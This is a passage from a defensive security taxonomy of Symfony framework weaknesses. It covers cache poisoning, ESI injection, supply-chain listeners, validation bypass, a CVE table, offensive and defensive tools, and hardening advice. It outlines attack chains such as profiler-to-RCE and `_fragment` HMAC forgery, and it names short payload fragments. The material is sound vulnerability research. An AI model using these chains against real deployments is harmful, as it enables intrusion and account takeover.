| **Vary header manipulation** | `HttpCache` Store generates cache keys incorporating manipulable request attributes (Host, Accept-Language, proxy headers) — attacker poisons cache with modified responses | Symfony HttpCache or Varnish with manipulable Vary headers (CVE-2022-24894, CVSS 8.8) | ATO, XSS |
| **Host header cache poisoning** | Response contains URLs generated from `$request->getHost()` — attacker sends spoofed Host header, cached response serves attacker-controlled URLs to all users | Trusted proxies misconfigured + HTTP caching enabled | ATO |
| **Web cache deception** | `/my-account/profile/nonexistent.css` — Symfony routes to `/my-account/profile`, cache stores response keyed on `.css` URL, attacker retrieves victim's cached private page | CDN/cache caching based on file extension + route ignoring trailing path | INFO |

### §11-2. ESI Injection

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Stored XSS to RCE via ESI** | Injecting `<esi:include src="/_fragment?...">` into stored content — ESI-capable cache processes tag server-side, making internal request to `_fragment` endpoint | ESI processing enabled + stored XSS + `APP_SECRET` known | RCE |
| **ESI edge processing** | ESI tags in cached responses are processed at the cache layer (Varnish/Symfony HttpCache), bypassing application-level security entirely | ESI-capable reverse cache | AUTHZ |

---

## §12. Event Dispatcher Security

### §12-1. Priority-Based Security Bypass

The security firewall runs at priority `8` on `kernel.request`. Any listener registered at a higher priority executes before security.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **High-priority listener bypass** | A malicious or compromised bundle registers a `kernel.request` listener at priority > 8 — executes before FirewallListener, can modify request, set authentication, or short-circuit response | Supply chain compromise via Composer package | AUTHZ, RCE |
| **Compiler pass arbitrary code** | Custom `CompilerPassInterface` runs during container compilation with full PHP privileges — a malicious bundle compiler pass executes code during every `cache:warmup` | Untrusted bundle installed via Composer | RCE |
| **Event subscriber manipulation** | Bundle `services.yaml` registers listeners on security events (`security.authentication.success`, `security.interactive_login`) to intercept credentials | Supply chain attack | ATO |

---

## §13. Validator Component — Validation Bypass via Groups

### §13-1. Validation Group Silent Bypass

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Group omission disables validation** | `$validator->validate($user)` without groups only validates `Default` group — constraints in `registration` group are completely skipped | Password/security constraints in non-default groups | AUTHZ |
| **Cascading group propagation failure** | `#[Assert\Valid]` on nested object — parent validated with `checkout` group but nested object constraints in that group may not fire depending on cascade config | Complex entity relationships with validation groups | AUTHZ |
| **No detection mechanism** | No static analysis, runtime warning, or configuration validation detects that properties have constraints only in non-default groups that might be silently skipped | Framework-level validation gap | AUTHZ |

---

## §14. DependencyInjection — Container & Configuration Security

### §14-1. Service Container Exposure

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Public service access** | Any `public: true` service retrievable via `$container->get()` — database connections, mailer, token storage directly accessible | Debug code or admin panels with container access | INFO, RCE |
| **Environment variable resolution** | YAML service definitions support `%env(DATABASE_URL)%` — attacker influencing config can read arbitrary env vars | Configuration injection (admin panels, YAML injection) | INFO |
| **Cached container secret exposure** | `var/cache/prod/Container*.php` contains all resolved parameter values including credentials and `APP_SECRET` | `var/cache/` web-accessible or file-read primitive | INFO |
| **Compiler pass code execution** | `CompilerPassInterface` runs during compilation with full PHP privileges — supply chain vector through Composer bundles | Malicious bundle in `composer.json` | RCE |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture / Conditions | Primary Mutation Categories |
|----------|--------------------------|---------------------------|
| **Profiler-to-RCE chain** | Debug profiler accessible → extract `APP_SECRET` → forge `_fragment` URL → arbitrary controller invocation | §2 + §3 + §10 |
| **Deserialization RCE** | Any `unserialize()` sink reachable with user input (cache, session, cookie, PHAR) + Symfony classes in autoload | §1 |
| **Mass Assignment Privilege Escalation** | JSON API endpoint using Serializer without groups → set `role=ROLE_ADMIN` on User entity | §7 + §9-3 |
| **Cache Poisoning → Account Takeover** | Proxy header manipulation → poisoned cached response → victim receives attacker-controlled URLs | §5-1 + §11 |
| **Firewall Bypass → Unauthorized Access** | Path normalization differential between security regex and router → protected endpoint accessed without auth | §6-1 + §9-2 |
| **Template Injection → Full Compromise** | User input reaches Twig template (template name or content injection) → `app.request.server.get('APP_SECRET')` → `_fragment` RCE | §4 + §2 + §3 |
| **ESI Injection → RCE** | Stored XSS in ESI-enabled page → `<esi:include>` tag fetches `_fragment` with forged HMAC → server-side code execution | §4-4 + §11-2 + §3 |
| **Supply Chain → Persistent Backdoor** | Malicious Composer bundle registers high-priority event listener or compiler pass → pre-firewall code execution | §12 |
| **Session Fixation → CSRF Chain** | Session fixation via missing strict mode → attacker knows session ID → derive valid CSRF tokens → state-changing operations | §5-4 + §8-1 + §6-3 |

---

## CVE / Bounty Mapping (2014–2024)

| Mutation Combination | CVE / Case | Year | CVSS | Impact |
|---------------------|-----------|------|------|--------|
| §1-1 (Remember-me deser) | CVE-2019-10912 | 2019 | 9.8 | RCE via remember-me cookie deserialization |
| §1-1 (Cache deser) | CVE-2019-18889 | 2019 | 9.8 | RCE via cache adapter deserialization |
| §4-3 (Sandbox bypass) | CVE-2022-23614 | 2022 | 9.8 | Twig sandbox bypass to full code execution |
| §3-1 (_fragment RCE) | CVE-2020-15094 | 2020 | 9.1 | RCE via `_fragment` route with leaked `APP_SECRET` |
| §11-1 (Cache poisoning) | CVE-2022-24894 | 2022 | 8.8 | HTTP cache poisoning in HttpKernel Store |
| §6-3 (Session fixation) | CVE-2022-24895 | 2022 | 8.8 | Session fixation via improper proxy handling |
| §4-1 (Template path traversal) | CVE-2022-39261 | 2022 | 7.5 | Arbitrary file read via Twig `source()`/`include()` |
| §4-3 (sort filter bypass) | CVE-2020-15098 | 2020 | Critical | Twig sandbox bypass via `sort` filter callable |
| §5-3 (X-Original-URL) | CVE-2018-14773 | 2018 | High | Request path override via header injection |
| §5-1 (Proxy bypass) | CVE-2024-24569 | 2024 | High | Trusted proxy bypass via IPv6-mapped IPv4 |
| §5-3 (Redirect) | CVE-2024-50345 | 2024 | Medium | Open redirect in `RedirectResponse` |
| §4-1 (Template name injection) | CVE-2024-51996 | 2024 | High | Code injection via user-controlled template names in Twig `Environment::render()` |
| §6-3 (Auth bypass) | CVE-2023-46733 | 2023 | High | Session not invalidated in remember-me configs |
| §6-3 (Cookie auth bypass) | CVE-2021-41268 | 2021 | High | Cookie-based session authentication bypass |
| §3-1 (Firewall bypass) | CVE-2021-41267 | 2021 | Medium | Firewall bypass through `_fragment` URIs |
| §6-3 (Session fixation) | CVE-2018-11385 | 2018 | High | Session fixation via authentication migration failure |
| §6-3 (Open redirect) | CVE-2018-19790 | 2018 | Medium | Open redirect in `DefaultAuthenticationSuccessHandler` |
| §8-1 (CSRF seeding) | CVE-2016-1902 | 2016 | High | Weak RNG fallback (SecureRandom used `mt_rand()` when OpenSSL unavailable) |
| §8-1 (CSRF removal) | CVE-2014-5245 | 2014 | Medium | CSRF bypass by removing token field entirely |

---

## Detection Tools

### Offensive Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **PHPGGC** (Ambionics) | §1 — Deserialization gadget chains | Library of pre-built POP chains for Symfony (RCE1-4, FW1-2, FD1) + Monolog, Doctrine, Guzzle |
| **Symfony Exploit Scripts** | §3 — `_fragment` RCE | `APP_SECRET` → HMAC forgery → arbitrary controller invocation via `_fragment` |
| **Tplmap** | §4 — SSTI detection & exploitation | Automated template injection scanner supporting Twig payloads |
| **SSTImap** | §4 — SSTI detection & exploitation | SSTI scanner with Twig-specific payload generation |
| **ffuf / feroxbuster** | §10 — Profiler discovery | Fuzzing for `/_profiler/`, `/_wdt/`, `/app_dev.php/` paths |
| **GitTools** | §2-2 — Secret extraction | `.git/` directory dump → `.env` with `APP_SECRET` from repository history |
| **nuclei** (Symfony templates) | Multiple | Community templates for Symfony debug detection, actuator-like profiler exposure, known CVEs |

### Defensive Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **Symfony Security Checker** | Dependencies | Checks `composer.lock` for known vulnerable packages (including gadget-chain-capable libraries) |
| **PHPStan / Psalm** | §7, §9 — Static analysis | Strict typing enforcement, taint analysis for user input flowing to dangerous sinks |
| **Snuffleupagus** | §1 — Runtime hardening | PHP module that hardens `unserialize()`, disables `eval()`, enforces strict comparison |
| **Roave Security Advisories** | Dependencies | Composer plugin that prevents installation of packages with known vulnerabilities |
| **Symfony Secrets Vault** | §2 — Secret management | Per-environment encrypted secrets — avoids `.env` file `APP_SECRET` exposure |
| **SensioLabs Insight / SymfonyInsight** | Multiple | Automated Symfony-specific code quality and security analysis |

---

## Summary: Core Principles

### Why the Symfony Ecosystem Is a Rich Attack Surface

Symfony's fundamental design philosophy — **component-based architecture with convention over configuration** — creates five structural tensions that define its security posture:

**1. Single Secret Architecture:** `APP_SECRET` is the cryptographic root for CSRF tokens, remember-me cookies, `_fragment` route HMAC, signed URIs, and login links. This is a **single point of failure by design** — one leaked environment variable compromises every security subsystem simultaneously. The framework provides no key derivation per subsystem and no rotation mechanism.

**2. Explicit vs. Magical Binding Inconsistency:** The Form component requires explicit field definitions (an inherent whitelist — secure by design), while the Serializer auto-binds all matching properties (insecure by default). Developers who learn safe patterns in one component carry unsafe assumptions into the other.

**3. Configuration Depth vs. Correctness:** Application security depends on correct configuration at 6+ independent layers: debug mode, trusted proxies, firewall ordering, access control regex, voter strategy, CSRF enablement, session cookies, and validation groups. The probability of ALL layers being correctly configured decreases multiplicatively with each layer.

**4. PHP Type System vs. Framework Strictness:** Symfony attempts to impose type safety through `InputBag`, route requirements, and Validator constraints. But PHP's foundational loose typing (silent coercion in `ParameterBag`, type juggling in comparisons, reflection bypassing visibility in `PropertyNormalizer`) undermines these efforts at every trust boundary.

**5. Backward Compatibility Tax:** Changing `access_decision_manager.strategy` from `affirmative` to `unanimous`, `ALLOW_EXTRA_ATTRIBUTES` from `true` to `false`, or `cookie_secure` from empty to `true` would break existing applications. Symfony prioritizes backward compatibility, meaning insecure defaults persist across major versions.

### Why Incremental Fixes Fail

The Symfony vulnerability space resists incremental patching for three structural reasons:

1. **The gadget chain surface regenerates.** Each new Symfony component or Composer dependency potentially introduces new `__destruct()`/`__wakeup()`/`__toString()` chains. PHPGGC documents 10+ Symfony-specific chains, and new ones are discovered regularly. The only structural fix is eliminating `unserialize()` from all data paths — but backward compatibility prevents this.

2. **Session/token lifecycle creates complex state transitions.** The interaction between session migration, remember-me tokens, CSRF tokens seeded from session IDs, and multi-firewall boundary crossing creates combinatorial state that has produced 4+ fixation CVEs over 6 years. Each fix addresses one transition path while leaving others exploitable.

3. **The `_fragment` route is an architectural backdoor.** It provides a legitimate function (ESI fragment rendering) through a mechanism (universal controller invocation gated only by HMAC) that becomes catastrophic when the single secret is compromised. The feature exists by design and is enabled by default.

### Structural Solution Direction

- Use Symfony Secrets Vault (`secrets:set`) instead of `.env` for `APP_SECRET` — prevents VCS exposure
- Disable `_fragment` route if ESI/HInclude is not used: `framework: fragments: { enabled: false }`
- Use `strategy: unanimous` for AccessDecisionManager in all production applications
- Enforce serialization `groups` on ALL Serializer deserialization of external input + `ALLOW_EXTRA_ATTRIBUTES => false`
- Use DTOs instead of entities for all API input/output through the Serializer
- Add explicit `requirements` regex constraints to every route parameter
- Set `cookie_secure: true`, `use_strict_mode: true` for sessions
- Restrict `dev` firewall to `when@dev` environment only
- Block web access to `var/cache/`, `.env`, `.git/` at the web server level
- Prefer route-based security (`#[IsGranted]`) over path-regex `access_control` to eliminate normalization mismatches
- Use `|e('js')`, `|e('url')`, `|e('css')` for context-specific Twig escaping — never rely on default HTML-only auto-escaping in non-HTML contexts

---

## References

### Sources Consulted

- Symfony Official Security Advisories (symfony.com/blog/category/security-advisories)
- National Vulnerability Database (nvd.nist.gov) — Symfony CVE records 2014–2024
- PHPGGC Gadget Chain Library (github.com/ambionics/phpggc) — Symfony RCE/FW/FD chains
- Symfony GitHub Repository (github.com/symfony/symfony) — Source code analysis of HttpFoundation, HttpKernel, Security, Serializer, Form, Routing, PropertyAccess, DependencyInjection, TwigBridge
- Twig Engine Source (github.com/twigphp/Twig) — EscaperExtension, sandbox implementation
- Ambionics Research — `_fragment` route exploitation, PHAR deserialization, CVE-2024-2961
- Synacktiv Research — PHP filter chains, Twig SSTI exploitation
- PortSwigger Research — SSTI, cache poisoning, web cache deception
- HackTricks — Symfony-specific exploitation guides
- PayloadsAllTheThings — PHP deserialization, type juggling, SSTI payloads
- Symfony Official Documentation — Security, Serializer, Form, Routing, Configuration reference
- OWASP — Mass assignment, CSRF, SSTI guidelines

---

*This document was created for defensive security research and vulnerability understanding purposes.*
